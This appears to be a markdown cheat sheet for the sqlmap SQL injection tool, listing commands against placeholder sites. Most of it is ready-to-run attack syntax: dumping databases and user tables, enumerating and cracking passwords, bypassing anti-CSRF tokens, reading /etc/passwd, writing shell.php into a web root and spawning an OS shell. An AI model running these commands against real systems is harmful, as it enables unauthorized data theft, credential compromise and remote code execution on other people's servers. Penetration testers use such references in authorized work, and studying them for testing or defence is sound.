# SQLMAP AUTOMATED SQL INJECTION TOOL

## Commands:

### Database enumeration: 

    sqlmap -U "http://www.example.com/page.php?id=1" --dbs 

### Database Table enumeration: 

    sqlmap -U "http://www.example.com/page.php?id=1" --tables -D DATABASE

### Table columns enumeration:  

    sqlmap -U "http://www.example.com/page.php?id=1" --columns -D DATABASE -T TABLE

### Table information dumping: 

    sqlmap -U "http://www.example.com/page.php?id=1" --dump -D DATABASE -T TABLE

#### -r HTTP_REQUEST_FILE = Use file from web proxies (Burpsuite) instead of writing entire URL

#### -u = URL 

#### --forms = Parse and test forms

#### --batch = Non-interactive mode (accepts default answers)

#### --crawl = How deep you want to crawl a site

#### --level = Different levels of tests ( Default = 1, Most = 5)

#### --risk = Different risk of tests ( Default = 1, Most = 3)

#### --os-shell = If the server is vulnerable to RCE via SQL Injection, it spawns an interactive shell to execute commands

| **Command**                                                  | **Description**                                             |
| ------------------------------------------------------------ | ----------------------------------------------------------- |
| `sqlmap -h`                                                  | View the basic help menu                                    |
| `sqlmap -hh`                                                 | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`   | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`  | `SQLMap` with POST request                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                          | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`        | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`             | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`          | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`  | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                      | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`        | Spawning an OS shell                                        |
